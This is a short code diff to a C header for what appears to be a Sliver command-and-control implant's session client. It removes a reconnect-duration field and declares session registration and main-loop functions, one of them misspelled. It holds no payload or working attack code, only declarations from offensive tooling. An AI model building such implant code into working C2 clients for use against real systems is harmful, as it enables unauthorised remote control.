@@ -9,5 +9,14 @@ struct _SLIVER_SESSION_CLIENT {
 	CLIENT_RECV Receive;
 	CLIENT_CLOSE Close;
 	CLIENT_CLEANUP Cleanup;
-	UINT64 uReconnectDuration;
 };
+
+BOOL SesionRegister
+(
+	_In_ PSLIVER_SESSION_CLIENT pSession
+);
+
+VOID SessionMainLoop
+(
+	_In_ PSLIVER_SESSION_CLIENT pSession
+);
